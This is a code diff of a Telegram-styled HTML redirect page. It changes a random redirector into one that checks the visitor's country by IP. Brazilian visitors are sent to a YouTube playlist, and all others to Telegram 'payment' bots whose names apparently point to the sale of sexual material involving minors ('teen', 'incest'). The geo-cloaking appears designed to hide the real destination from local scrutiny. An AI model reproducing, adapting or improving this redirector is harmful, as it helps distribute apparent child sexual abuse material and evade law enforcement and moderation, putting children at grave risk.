@@ -2,7 +2,7 @@
 <html lang="pt-BR">
 <head>
   <meta charset="UTF-8">
-  <title>Redirecionando...</title>
+  <title>Verificando...</title>
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
   <style>
     body {
@@ -15,6 +15,13 @@
       align-items: center;
       height: 100vh;
       flex-direction: column;
+      text-align: center;
+    }
+
+    .container {
+      display: flex;
+      flex-direction: column;
+      align-items: center;
     }
 
     .telegram-logo {
@@ -22,7 +29,7 @@
       margin-bottom: 20px;
     }
 
-    .loading-text {
+    .status-text {
       font-size: 1.2rem;
       margin-bottom: 10px;
       color: #444;
@@ -40,7 +47,7 @@
       width: 0;
       height: 100%;
       background-color: #0088cc;
-      animation: loading 0.15s linear forwards;
+      animation: loading 1.5s linear forwards;
     }
 
     @keyframes loading {
@@ -52,44 +59,69 @@
 </head>
 <body>
   
-  <svg class="telegram-logo" viewBox="0 0 240 240" fill="none" xmlns="http://www.w3.org/2000/svg">
-    <circle cx="120" cy="120" r="120" fill="#0088CC"/>
-    <path d="M97.5 120.5L149.5 98L129 148L97.5 120.5Z" fill="#C8DAEA"/>
-    <path d="M97.5 120.5L118 139.5L129 148L97.5 120.5Z" fill="#A9C9DD"/>
-    <path d="M97.5 120.5L149.5 98L118 139.5L97.5 120.5Z" fill="white"/>
-  </svg>
-  
-  <div class="loading-text">Redirecionando...</div>
-  <div class="progress-bar">
-    <div class="progress"></div>
+  <div class="container" id="loading-container">
+    <svg class="telegram-logo" viewBox="0 0 240 240" fill="none" xmlns="http://www.w3.org/2000/svg">
+      <circle cx="120" cy="120" r="120" fill="#0088CC"/>
+      <path d="M97.5 120.5L149.5 98L129 148L97.5 120.5Z" fill="#C8DAEA"/>
+      <path d="M97.5 120.5L118 139.5L129 148L97.5 120.5Z" fill="#A9C9DD"/>
+      <path d="M97.5 120.5L149.5 98L118 139.5L97.5 120.5Z" fill="white"/>
+    </svg>
+    
+    <div class="status-text" id="status-text">Verificando sua região...</div>
+    <div class="progress-bar">
+      <div class="progress"></div>
+    </div>
   </div>
 
   <script>
-    // Lista de links
-    const links = [
-      "https://t.me/teenpayments_bot",
-      "https://t.me/incetspaymentes_bot",
-      "https://t.me/incesteenpayments_bot",
-      "https://t.me/incesteenpayments01_bot",
-      "https://t.me/teenpay02ments_bot",
-      "https://t.me/teenpay03ments_bot",
-      "https://t.me/incesteenpayments05_bot",
-      "https://t.me/incesteenpayments0_bot"
+    // Seleciona os elementos da página que vamos manipular
+    const statusText = document.getElementById('status-text');
+    const loadingContainer = document.getElementById('loading-container');
+
+    // Lista de links para quem está FORA do Brasil
+    const linksInternacionais = [
+      "https://t.me/teenpayments_bot?start=true",
+      "https://t.me/incetspaymentes_bot?start=true",
+      "https://t.me/incesteenpayments_bot?start=true",
+      "https://t.me/incesteenpayments01_bot?start=true",
+      "https://t.me/teenpay02ments_bot?start=true",
+      "https://t.me/teenpay03ments_bot?start=true",
+      "https://t.me/incesteenpayments05_bot?start=true",
+      "https://t.me/incesteenpayments0_bot?start=true"
     ];
+    
+    // Link para quem está NO Brasil
+    const linkBrasil = "https://www.youtube.com/playlist?list=PLsshkztVdrAlFb00pRrYasdEISm0nODpV";
 
-    // Verifica se já existe um link salvo no navegador
-    let linkDestino = localStorage.getItem("linkEscolhido");
+    // Função para buscar a localização do usuário
+    function verificarLocalizacao() {
+      // Usamos a API 'ip-api.com' para obter o código do país pelo IP
+      fetch('https://ip-api.com/json/?fields=countryCode')
+        .then(response => response.json())
+        .then(data => {
+          // Atualiza o texto, pois todos serão redirecionados
+          statusText.textContent = 'Redirecionando...';
 
-    // Se não existir, escolhe um aleatório e salva
-    if (!linkDestino) {
-      linkDestino = links[Math.floor(Math.random() * links.length)];
-      localStorage.setItem("linkEscolhido", linkDestino);
+          // Se o código do país for 'BR' (Brasil)
+          if (data.countryCode === 'BR') {
+            // Redireciona para o link do Brasil
+            location.replace(linkBrasil);
+          } else {
+            // Se for de qualquer outro país (ou a API não retornar o país)
+            const linkAleatorio = linksInternacionais[Math.floor(Math.random() * linksInternacionais.length)];
+            location.replace(linkAleatorio);
+          }
+        })
+        .catch(error => {
+          // Em caso de erro ao verificar a localização
+          console.error('Erro ao verificar a localização:', error);
+          statusText.textContent = 'Não foi possível verificar sua região.';
+          loadingContainer.innerHTML = `<div class="status-text">${statusText.textContent}</div>`;
+        });
     }
 
-    // Redireciona após 0.15s
-    setTimeout(() => {
-      location.replace(linkDestino);
-    }, 150);
+    // Inicia a verificação quando a página carrega
+    verificarLocalizacao();
   </script>
 </body>
 </html>
